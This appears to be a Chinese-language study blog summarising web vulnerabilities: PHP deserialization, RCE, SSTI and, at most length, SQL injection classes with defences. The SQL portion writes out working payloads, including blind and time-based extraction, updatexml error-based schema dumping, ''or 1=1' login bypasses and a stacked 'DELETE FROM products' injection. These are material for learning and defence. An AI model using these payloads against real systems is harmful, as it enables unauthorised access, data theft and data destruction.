<p>漏洞的形成的<u><strong>根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果</strong></u>。反序列化漏洞并不是PHP特有，<u><strong>也存在于Java、Python等语言</strong></u>之中，但其原理基本相通。</p>
<p>PHP类都含有几个特定的元素: 类属性、类常量、类方法。每一个类至少都含有以上三个元素，而这三个元素也可以组成最基本的类。那么按照特定的格式将这三个元素表达出来就可以将一个完整的类表示出来并传递。</p>
<p><u>序列化就是将一个<strong>类</strong>压缩成一个字符串的方法</u></p>
<h3 id="2-危害-10"><a href="#2-危害-10" class="headerlink" title="2.危害"></a>2.危害</h3><p><u><strong>未对用户输入的序列化字符串进行检测</strong></u>，导致<u><strong>攻击者可以控制反序列化过程</strong></u>，从而<u><strong>导致代码执行，SQL注入，目录遍历等不可控后果</strong></u>。在反序列化的过程中自动触发了某些魔术方法。</p>
<h3 id="3-防御-10"><a href="#3-防御-10" class="headerlink" title="3.防御"></a>3.防御</h3><h4 id="1-签名与认证"><a href="#1-签名与认证" class="headerlink" title="1)签名与认证"></a>1)签名与认证</h4><p>如果序列化的内容没有用户可控参数，仅仅是服务端存储和应用，则可以通过签名认证，来避免应用接受黑客的异常输入。   </p>
<h4 id="2-限制序列化与反序列化的类"><a href="#2-限制序列化与反序列化的类" class="headerlink" title="2)限制序列化与反序列化的类"></a>2)限制序列化与反序列化的类</h4><p>增加一层序列化和反序列化接口类。这就相当于允许提供了一个白名单的过滤：只允许某些类可以被反序列化。只要你在反序列化的过程中，避免接受处理任何类型（包括类成员中的接口、泛型等），黑客其实很难控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就很难利用反序列化漏洞了</p>
<h4 id="3-RASP检测"><a href="#3-RASP检测" class="headerlink" title="3)RASP检测"></a>3)RASP检测</h4><p>（<code>Runtime Application Self-Protection</code>，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数（例如：序列化，反序列化)的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截.</p>
<h3 id="4-利用"><a href="#4-利用" class="headerlink" title="4.利用"></a>4.利用</h3><h4 id="1-wakeup-绕过"><a href="#1-wakeup-绕过" class="headerlink" title="1)__wakeup( )绕过"></a>1)__wakeup( )绕过</h4><p><code>(CVE-2016-7124)</code></p>
<p>反序列化时，如果表示对象<code>属性个数的值大于真实的属性个数</code>时就会<code>跳过__wakeup( )的执行</code>。</p>
<h4 id="2-注入对象构造方法"><a href="#2-注入对象构造方法" class="headerlink" title="2)注入对象构造方法"></a>2)注入对象构造方法</h4><p>当目标对象被<code>private、protected修饰时的构造方法</code>。</p>
<h4 id="3-Session反序列化漏洞"><a href="#3-Session反序列化漏洞" class="headerlink" title="3)Session反序列化漏洞"></a>3)Session反序列化漏洞</h4><p>PHP中的<code>Session经序列化后存储，读取时再进行反序列化</code>。</p>
<h4 id="4-PHAR利用"><a href="#4-PHAR利用" class="headerlink" title="4)PHAR利用"></a>4)PHAR利用</h4><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p>
<hr>
<h2 id="十二、rce漏洞篇"><a href="#十二、rce漏洞篇" class="headerlink" title="十二、rce漏洞篇"></a>十二、rce漏洞篇</h2><h3 id="1-rce漏洞原理"><a href="#1-rce漏洞原理" class="headerlink" title="1.rce漏洞原理"></a>1.rce漏洞原理</h3><p>一般出现这种漏洞，是因为应用系统<u><strong>从设计上需要给用户提供指定的远程命令操作的接口</strong></u>。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，<u><strong>没有做严格的安全控制，则可能会<code>导致攻击者通过该接口提交“意想不到”的命令</code>，从而让后台进行执行，从而控制整个后台服务器</strong></u>。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 </p>
<blockquote>
<p>因此，如果需要给<u><strong>前端用户提供操作类的API接口（一般指应用程序的编程接口，主要目的是提供应用程序与开发人员以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节），一定需要对接口输入的内容进行严格的判断</strong></u>，比如<code>实施严格的白名单策略</code>会是一个比较好的方法。</p>
</blockquote>
<h3 id="2-危害-11"><a href="#2-危害-11" class="headerlink" title="2.危害"></a>2.危害</h3><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入<u><strong>操作系统命令或者代码</strong></u>，从而控制后台系统。</p>
<h3 id="3-防御-11"><a href="#3-防御-11" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>1)尽量不要使用命令执行函数。</p>
<p>2)不要让用户控制参数。</p>
<p>3)执行前做好检测和过滤。</p>
</blockquote>
<h2 id="十三、ssti漏洞篇"><a href="#十三、ssti漏洞篇" class="headerlink" title="十三、ssti漏洞篇"></a>十三、ssti漏洞篇</h2><h3 id="1-ssti漏洞原理"><a href="#1-ssti漏洞原理" class="headerlink" title="1.ssti漏洞原理"></a>1.ssti漏洞原理</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679#toc-0">推荐文章</a></p>
<p>SSTI是一种注入类的漏洞，其<code>成因也可以类比SQL注入</code><br>SQL注入是从用户获得一个输入，然后用后端脚本语言进行数据库查询，利用输入来拼接我们想要的SQL语句。SSTI也是获取一个输入，然后在后端的渲染处理上进行语句的拼接执行。但是和SQL注入不同的，</p>
<p>SSTI利用的是现有的网站模板引擎，主要针对Python、PHP、JAVA的一些网站处理框架，比如Python的<strong>jinja2、mako、tornado、Django</strong>，PHP的<strong>smarty twig</strong>，java的<strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候，在过滤不严情况下，通过构造恶意输入数据，从而达到getshell或其他目的。</p>
<blockquote>
<p><code>一句话就是服务端在接收用户输入或用户可控参数后，未作处理或未进行严格过滤，直接嵌入模板渲染，导致执行恶意代码</code></p>
</blockquote>
<p><strong>模板注入</strong>涉及的是服务端Web应用使用模板引擎<strong>渲染用户请求的过程</strong>，<br> 服务端把<strong>用户输入的内容渲染成模板</strong>就可能造成SSTI(Server-Side Template Injection)</p>
<p>模板渲染接受的参数需要用两个大括号<code>&#123;  &#123;&#125;  &#125;</code>括起来</p>
<h3 id="2-危害-12"><a href="#2-危害-12" class="headerlink" title="2.危害"></a>2.危害</h3><p>攻击者在服务器输入语句，服务端将其<u><strong>作为Web应用模板内容的一部分</strong></u>，在进行<u><strong>目标编译渲染</strong></u>的过程中，<u><strong>进行了语句的拼接，执行了所插入的恶意内容</strong></u>，从而<u><strong>导致信息泄露、代码执行、GetShell等</strong></u>问题</p>
<h3 id="3-防御-12"><a href="#3-防御-12" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>1）和其他的注入防御一样，<u><strong>绝对不要让用户对传入模板的内容或者模板本身进行控制</strong></u></p>
<p>2）<u><strong>减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染</strong></u>方式，<u><strong>使用正规的模板渲染方法</strong></u></p>
</blockquote>
<h1 id="漏洞知识点记录笔记（一）"><a href="#漏洞知识点记录笔记（一）" class="headerlink" title="漏洞知识点记录笔记（一）"></a>漏洞知识点记录笔记（一）</h1><blockquote>
<p>补充一些知识点</p>
</blockquote>
<h2 id="一、sql"><a href="#一、sql" class="headerlink" title="一、sql"></a>一、sql</h2><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><h4 id="1-按照数据提交的方式来分类："><a href="#1-按照数据提交的方式来分类：" class="headerlink" title="1.按照数据提交的方式来分类："></a>1.按照数据提交的方式来分类：</h4><p>  （1）<code>GET</code> 注入：提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
<p>  （2）<code>POST</code> 注入：使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中(输入框)。</p>
<p>  （3）<code>Cookie</code> 注入：HTTP请求的时候会带上客户端的Cookie, 注入点在Cookie当中的某个字段中。</p>
<p>  （4）<code>HTTP</code> 头部注入：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<h4 id="ps-下面几点是注入中经常会用到的语句"><a href="#ps-下面几点是注入中经常会用到的语句" class="headerlink" title="ps.下面几点是注入中经常会用到的语句"></a>ps.下面几点是注入中经常会用到的语句</h4><blockquote>
<p>控制语句操作<code>(select, case, if(), …)</code></p>
<p>比较操作<code>(=, like, mod(), …)</code></p>
<p>字符串的猜解操作<code>(mid(), left(), rpad(), …)</code></p>
<p>字符串生成操作<code>(0x61, hex(), conv()(使用conv([10-36],10,36)</code>可以实现所有字符的表示))</p>
</blockquote>
<h4 id="2-按照执行效果来分类："><a href="#2-按照执行效果来分类：" class="headerlink" title="2.按照执行效果来分类："></a>2.按照执行效果来分类：</h4><h5 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h5><blockquote>
<p>也可以用if函数进行</p>
<p>例如</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((<span class="keyword">select</span>(database())),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>如果条件符号返回1，不符合返回2</p>
</blockquote>
<blockquote>
<p>bool盲注，即可以根据返回页面判断条件真假的注入。</p>
<p>一般根据数据字符asiic码大小或字符长短，用二分法进行判断字符答案</p>
<p>长度比如</p>
</blockquote>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> length(database()) &gt; <span class="number">5</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>意思就是判断数据库名大于5，如果返回假就在小于5里找，如果返回真，就在大于5范围里找，猜测到大概的长度的时候，可以用&#x3D;试试</p>
</blockquote>
<blockquote>
<p>对于单一字符猜测，可以利用字母的<code>ascii</code>码，</p>
</blockquote>
<p>比如</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>substr是截取字符，如上就是从第一个字符截取，截取一个字符<br>意思就是判断数据库名第一个字母的ascii码是否大于110，返回假就在小于110里找，返回真，就在大于110里找，最后可以用&#x3D;加以确定</p>
</blockquote>
<p><code>可以用burpsuite进行payload爆破，用数字字典，直接从0-127（ascii码共127位），然后根据回显，判断，就不用一个一个慢慢尝试</code></p>
<p><code>强烈建议可以学习一下python，这样可以自己针对性的写一个脚本，效率更高</code></p>
<h5 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h5><blockquote>
<p>即不能根据页面返回内容判断任何信息，用条件语句（if）查看时间延迟语句（sleep()）是否执行（即页面返回时间是否增加）来判断。</p>
</blockquote>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="keyword">if</span>(length(database()&gt;<span class="number">7</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里判断如果数据库名大于7，就延迟网页5s，反正没有延迟【就是执行1】，剩下的和bool盲注一样，挨个试试，推测出数据库名和其他数据</p>
</blockquote>
<h6 id="时间盲注的函数或者方法"><a href="#时间盲注的函数或者方法" class="headerlink" title="时间盲注的函数或者方法"></a>时间盲注的函数或者方法</h6><blockquote>
<ul>
<li><p><strong>sleep()</strong></p>
</li>
<li><p>**benchmark ()**：测定某些特定操作的执行速度，结果值总是0，仅仅会执行显示时间</p>
<blockquote>
<p>benchmark (count,expr)，expr为执行表达式，count为执行次数</p>
<p>常用语句</p>
<p>SELECT BENCHMARK(100000000,(select database()));</p>
</blockquote>
</li>
<li><p><strong>笛卡尔积</strong>：通过做大量的查询导致查询时间较长来达到延时的目的。通常选择一些比较大的表做笛卡尔积运算</p>
</li>
</ul>
</blockquote>
<h5 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h5><blockquote>
<p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。如：单引号、双引号、基于数字型注入。</p>
</blockquote>
<p>比如，查询数据库名</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p> *<strong>注意</strong></p>
<blockquote>
<p>extractvalue和updatexml只显示<code>32</code>位字符</p>
<p>所以爆出字符不全时，可以用<code>left(xxx,length)</code>和<code>right(xxx,length)</code><br>【注意0x7e也就是<del>也算字符位，按上面例子用了两个</del>，所以这里最多只能select 30个字符了，但左右都30，一共可以select 60个字符】</p>
<p>或者用<code>substr(xxx,begin,length)</code>，从数据的某个开始【这里的开始位是从1开始，而不是0】截取一部分显示</p>
</blockquote>
<h5 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h5><p>可以使用union的情况下的注入。</p>
<h5 id="（5）堆查询注入（堆叠注入）"><a href="#（5）堆查询注入（堆叠注入）" class="headerlink" title="（5）堆查询注入（堆叠注入）"></a>（5）堆查询注入（堆叠注入）</h5><p>可以同时执行多条语句的执行时的注入。</p>
<h5 id="（6）宽字节注入"><a href="#（6）宽字节注入" class="headerlink" title="（6）宽字节注入"></a>（6）宽字节注入</h5><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ASCII%E7%A0%81&spm=1001.2101.3001.7020">ASCII码</a>要大于128，才到汉字的范围），示例如下图：</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230806195837908.png"><img src="/Web-study/image-20230806195837908.png" alt="image-20230806195837908"></a></p>
<p>MYSQL默认字符集是GBK等宽字节字符集。如上图所示%df’被PHP转义，单引号被加上反斜杠\，变成了%d’，其中\的十六进制是%5C，那么现在%d’&#x3D;%d%5C%27,如果程序的默认字符集是GBK等宽字节字符集，MYSQL用GBK编码时，会认为%df%5C是一个宽字符，也就是縗，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就可以注入了</p>
<p>用来绕过<strong>addslashes</strong></p>
<h4 id="③按照注入点类型来分类："><a href="#③按照注入点类型来分类：" class="headerlink" title="③按照注入点类型来分类："></a>③按照注入点类型来分类：</h4><p>  （1）数字型注入点：许多网页链接有类似的结构 <code>http://xxx.com/users.php?id=1</code> 基于此种形式的注入，其注入点 id 类型为数字若存在注入点，则可以利用网页通过此种结构传递id等信息的原理，构造出类似如下的sql注入语句进行爆破：select * from 表名 where id&#x3D;1 and 1&#x3D;1</p>
<p>  （2）字符型注入点：网页链接有类似的结构 <code>http://xxx.com/users.php?name=admin</code> 这种形式，其注入点 name 类型为字符类型，若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where name&#x3D;‘admin’ and 1&#x3D;1 ’</p>
<p>  （3）搜索型注入点：这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword&#x3D;关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where 字段 like ‘%测试%’ and ‘%1%’&#x3D;’%1%’</p>
<h4 id="④基于程度和顺序的注入-哪里发生了影响"><a href="#④基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="④基于程度和顺序的注入(哪里发生了影响)"></a>④基于程度和顺序的注入(哪里发生了影响)</h4><p><code>★一阶注射</code> </p>
<p><code>★二阶注射</code> </p>
<blockquote>
<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；</p>
<p>二阶注入类似存储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入. </p>
</blockquote>
<h4 id="1-堆叠注入"><a href="#1-堆叠注入" class="headerlink" title="1.堆叠注入"></a>1.堆叠注入</h4><h5 id="1-堆叠注入定义"><a href="#1-堆叠注入定义" class="headerlink" title="1.堆叠注入定义"></a>1.堆叠注入定义</h5><blockquote>
<p>   Stacked  injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在  mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。</p>
</blockquote>
<h5 id="2-堆叠注入原理"><a href="#2-堆叠注入原理" class="headerlink" title="2.堆叠注入原理"></a>2.堆叠注入原理</h5><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。<u>试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入</u>。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<u>union 或者union all执行的语句类型是有限的，可以用来执行查询语句</u>，而<u>堆叠注入可以执行的是任意的语句</u>。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：  <code>Select * from products where productid=1;DELETE FROM products</code>当执行查询后，<u><strong>第一条显示查询信息</strong></u>，<u><strong>第二条则将整个表进行删除</strong></u>。</p>
<h5 id="3-堆叠注入的局限性"><a href="#3-堆叠注入的局限性" class="headerlink" title="3.堆叠注入的局限性"></a>3.堆叠注入的局限性</h5><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><strong>下面我以一道题为例解析堆叠注入，该题来自于<a href="../../../../2022/06/21/buuctf-wp"> buuctf的[强网杯 2019]随便注 </a></strong></p>
<h4 id="2-无列名注入"><a href="#2-无列名注入" class="headerlink" title="2.无列名注入"></a>2.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lee-404/p/12833788.html">无列名注入</a></h4><p>上面链接是一篇大佬讲解的无列名注入，之前刷攻防世界遇到类似的题目，看了这篇文章学到了新技巧</p>
<h4 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="*3.联合注入"></a>*3.联合注入</h4><p><strong>联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据</strong></p>
<p>举个例子：<br>最初users表中只有一行数据，</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220909230928678.png"><img src="/Web-study/image-20220909230928678.png" alt="image-20220909230928678"></a></p>
<p><strong>我们通过<code>union select</code>查询就可以构造一行虚拟的数据，</strong></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220909231009396.png"><img src="/Web-study/image-20220909231009396.png" alt="image-20220909231009396"></a></p>
<p>这样，我们在users表中利用联合查询创建了一行虚拟的数据。</p>
<hr>
<h3 id="1-几个常用函数"><a href="#1-几个常用函数" class="headerlink" title="1.几个常用函数"></a>1.几个常用函数</h3><blockquote>
<p>1.<code>version()</code>——MySQL 版本 </p>
<p>2.<code>user()</code>——数据库用户名 </p>
<p>3.<code>database()</code>——数据库名 </p>
<p>4.<code>@@datadir</code>——数据库路径 </p>
<p>5.<code>@@version_compile_os</code>——操作系统版本</p>
</blockquote>
<h3 id="2-一般用于尝试的闭合语句"><a href="#2-一般用于尝试的闭合语句" class="headerlink" title="2.一般用于尝试的闭合语句"></a>2.一般用于尝试的<u>闭合语句</u></h3><p>Ps:&#96;&#96;–+可以用#替换，url 提交过程中 Url 编码后的#为%23，–和#为注释符，把后面语句注释掉，使其无法执行&#96;</p>
<blockquote>
<p>有时用–+，而不用#的原因是，http无法解释#，所以用–+来代替，<br>–+中起到注释作用其实是–，但是如果单纯的–会和后面的内容连上从而导致sql语句出错，所以有了+会解释为空格，从而避免报错<br>故<br>–%20   &lt;&#x3D;&#x3D;&gt;   –+</p>
</blockquote>
<blockquote>
<p>or 1&#x3D;1–+</p>
<p>‘or 1&#x3D;1–+</p>
<p>“or 1&#x3D;1–+</p>
<p>)or 1&#x3D;1–+</p>
<p>‘)or 1&#x3D;1–+</p>
<p>“) or 1&#x3D;1–+</p>
<p>“))or 1&#x3D;1–+</p>
</blockquote>
<h3 id="3-sql中逻辑运算【万能密码的原理】"><a href="#3-sql中逻辑运算【万能密码的原理】" class="headerlink" title="3.sql中逻辑运算【万能密码的原理】"></a>3.sql中逻辑运算【万能密码的原理】</h3><p>提出一个问题 <code>Select * from users where id=1 and 1=1</code>;这条语句为什么能够选择出 id&#x3D;1 的内容，and 1&#x3D;1 到底起作用了没有？这里就要清楚 sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我们可以用 <code>’or 1=1#</code> 作为密码输入。原因是为什么？ </p>
<p>这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为： </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * <span class="keyword">from</span> admin where <span class="attribute">username</span>=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;&#x27;</span>or <span class="attribute">1</span>=1#&#x27;</span><br></pre></td></tr></table></figure>

<p>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 <code>username=&#39;admin&#39; and password=&#39;&#39;or 1=1</code>。三个条件用 and 和 or 进行连接。在 sql 中，我们 <u><strong>and 的运算优先级大于 or 的元算优先级</strong></u>。因此可以看到 <u><strong>第一个条件（用 a 表示）是真的，第二个条件（用 b 表示）是假的，a and b &#x3D; false</strong></u>,第一个条件和第二个条件执行 and 后是假，再与<u><strong>第三 个条件 or 运算，因为第三个条件 1&#x3D;1 是恒成立的，所以结果自然就为真了</strong></u>。因此上述的语 句就是恒真了</p>
<p>ps.<strong><code>逻辑语句的区别</code></strong></p>
<blockquote>
<p>1.and:两个或多个条件同时满足，才为真（显示一条数据）</p>
<p>2.or:两个或多个条件满足其中一个即为真（显示一条数据）</p>
<blockquote>
<p>使用and语句注意<code>select * from test where a = 1 and a = 2</code>这样操作肯定不行，<u><strong>后面的一个值会把前面的值给覆盖掉</strong></u>，最后执行的是<code>select * from test where a = 2</code></p>
<p>而用or语句的话<code>select * from test where a = 1 or a = 2</code>,执行<code>select * from test where a = 1</code>,若<code>a=1</code>为假，则执行<code>select * from test where a = 2</code></p>
</blockquote>
</blockquote>
<blockquote>
<p>3.union:联合查询，将<u><strong>多个查询结果合并（如果有一个结果为空，不影响其他结果合并）</strong></u>起来时，<u><strong>系统会自动去掉重复元组</strong></u></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里注意，如果id&#x3D;1，那么结果合并时，就会覆盖后面的结果，所以这里需要前面的语句返回为空，那么后面的数据就会显现出来</p>
</blockquote>
<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。 </p>
<h3 id="4-注入的一般流程【按顺序查询注入】"><a href="#4-注入的一般流程【按顺序查询注入】" class="headerlink" title="4.注入的一般流程【按顺序查询注入】"></a>4.注入的一般流程【按顺序查询注入】</h3><h4 id="ps-关键记忆和使用"><a href="#ps-关键记忆和使用" class="headerlink" title="ps.关键记忆和使用"></a>ps.关键记忆和使用</h4><blockquote>
<p>schema_name 数据库名</p>
<p><code>information_schema.schemata</code> 全部数据库</p>
<p><code>table_name</code> 表名</p>
<p><code>information_schema.tables</code> 全部表</p>
<p><code>table_schema=’xxxxx’</code> ‘xxxx’为目标表所在的数据库名</p>
<p><code>column_name</code> 列名</p>
<p><code>information_schema.columns</code> 全部列名</p>
<p><code>table_name=’xxxxx’</code> ‘xxxx’想要查询数据所在的表名</p>
</blockquote>
<h4 id="1-注入语句"><a href="#1-注入语句" class="headerlink" title="[1] 注入语句"></a>[1] 注入语句</h4><blockquote>
<p>1）猜数据库 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select schema_name from information_schema.schemata</code> </p>
<p>2）猜某库的数据表 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select table_name from information_schema.tables where table_schema=’xxxxx’</code> </p>
<p>3）猜某表的所有列【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select column_name from information_schema.columns where table_name=’xxxxx’</code> </p>
<p>4）获取某列的内容 【以下语句功能，显示该列】</p>
<p><code>select column_name  from  table_name</code></p>
</blockquote>
<h4 id="2-注入流程图"><a href="#2-注入流程图" class="headerlink" title="[2] 注入流程图"></a>[2] 注入流程图</h4><p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154919325.png"><img src="/Web-study/image-20230803154919325.png" alt="image-20230803154919325"></a></p>
<h3 id="5-mysql错误分析解决"><a href="#5-mysql错误分析解决" class="headerlink" title="5.mysql错误分析解决"></a>5.mysql错误分析解决</h3><h4 id="1）子查询结果多于一行"><a href="#1）子查询结果多于一行" class="headerlink" title="1）子查询结果多于一行"></a>1）子查询结果多于一行</h4><p><code>Subquery returns more than 1 row</code></p>
<p>以<code>select * from table1 where table1.colums=(select columns from table2)</code>这个sql语句为例</p>
<blockquote>
<p>1.如果是写入重复，去掉重复数据。然后写入的时候，可以加逻辑判断(php)或者外键(mysql)，防止数据重复写入。（但在实际开发中可能需要重复写入，所以需要慎重考虑）</p>
<p>2.在子查询条件语句加<code>limit 1</code>,找到一个符合条件的就可以了<br><code>select * from table1 where table1.colums in (select columns from table2 limit 1)</code> </p>
<p>如果需要继续向后查询，可以用<code>limit 0,1</code>   <code>limit 1,1</code>   <code>limit 2,1</code>   …..  <code>limit n,1</code></p>
<p>3.在子查询前加any关键字<br>&#96;select * from table1 where table1.colums&#x3D;any(select columns from table2)</p>
</blockquote>
<h4 id="ps-子查询语句"><a href="#ps-子查询语句" class="headerlink" title="ps. 子查询语句"></a>ps. 子查询语句</h4><p><strong>子查询</strong>是指在<strong>一个select语句中嵌套另一个slecet语句</strong>。</p>
<p><strong>any、in、some、all</strong>分别是子查询关键词之一。</p>
<p><strong>any</strong>可以与&#x3D;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&lt;&gt;结合起来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的任何一个数据。</p>
<p>all可以与&#x3D;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&lt;&gt;结合是来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的其中的所有数据。</p>
<p>他们进行子查询的语法如下：</p>
<blockquote>
<p><code>operand comparison_operator any(subquery);</code><br><code>operand in (subquery);</code><br><code>operand coparison_operator some(subquery);</code><br><code>operand coparison_operator all (subquery);</code></p>
</blockquote>
<p><strong>any,all关键词必须与一个比较操作符一起使用</strong></p>
<p>any关键词可以理解为<strong>对于子查询返回的列中的<u>任意</u>数值，如果比较结果为ture，则返回true</strong><br>例如：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1 &gt; <span class="keyword">any</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> t2)</span><br></pre></td></tr></table></figure>

